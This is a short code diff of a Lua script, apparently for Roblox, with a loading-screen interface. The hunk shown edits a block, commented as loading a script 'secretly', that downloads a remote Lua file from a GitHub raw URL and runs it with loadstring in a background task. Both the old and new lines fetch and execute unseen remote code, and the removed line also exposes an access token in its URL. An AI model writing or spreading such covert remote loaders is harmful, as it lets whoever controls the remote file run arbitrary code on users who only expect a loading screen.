@@ -114,7 +114,7 @@ creditText.Parent = background
 -- Background loading script (Load the script secretly)
 task.spawn(function()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/test/refs/heads/main/script.lua?token=GHSAT0AAAAAADFNIACGOKGI2MO2EGFZY6TK2CQJJVA"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/main/script.lua"))()
     end)
     if not success then
         warn("Failed to load external script: ", err)
